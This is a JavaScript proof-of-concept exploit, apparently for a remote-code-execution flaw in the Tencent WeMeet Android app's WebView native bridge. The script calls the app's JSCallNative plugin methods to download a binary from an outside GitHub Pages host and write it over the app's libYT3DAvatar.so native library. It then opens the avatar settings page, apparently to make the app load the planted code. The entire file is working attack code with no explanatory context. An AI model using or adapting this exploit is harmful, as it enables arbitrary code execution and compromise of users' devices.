(function(){
  document.title='P96TB:'+location.host;
  window.__efp='';
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P96CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
    try{
      if(r&&r.callId==='EF'&&r.data){
        var d=r.data;
        window.__efp=d.path||d.local_path||d.file_path||d.dst_path||d.src_path||d.fileName||'';
      }
    }catch(e){}
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P96TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P96TB-NOMGR:'+location.host;return}
  var bin='https://gitwhs.github.io/wm-poc-rce/p96.bin';
  var dst='/data/data/com.tencent.wemeet.app/files/Global/Data/AvatarModel/10e43f8954c9fae6a643731926ccdcc6/jni/arm64-v8a/libYT3DAvatar.so';
  var dstdir='/data/data/com.tencent.wemeet.app/files/Global/Data/AvatarModel/10e43f8954c9fae6a643731926ccdcc6';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['EF','CommonPlugin','ExportFile',{
      fileName:'p96.bin',
      contentType:'application/octet-stream',
      url:bin
    }],
    ['SE','Storage','ExportFile',{
      src_path: (window.__efp||'p96.bin'),
      dst_path: dst,
      path: (window.__efp||'p96.bin'),
      fileName:'libYT3DAvatar.so',
      url:bin
    }],
    ['RF','Storage','RevealFolder',{
      path: dstdir,
      src_path: dstdir,
      folder: dstdir
    }],
    ['PD','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/package_download',
      router_params:{
        url:bin,
        download_url:bin,
        package_path:bin,
        md5:'cddbf6c965998afcf74ec6fac0a6b388',
        enable_patch:true
      }
    }],
    ['A1','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/ar_avatar_setting',
      router_params:{
        from_webView:true
      }
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P96TB-DONE:'+location.host;return}
    var x=q[i++];
    if(x[0]==='SE'){
      x[3].src_path=window.__efp||x[3].src_path;
      x[3].path=window.__efp||x[3].path;
    }
    document.title='P96-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
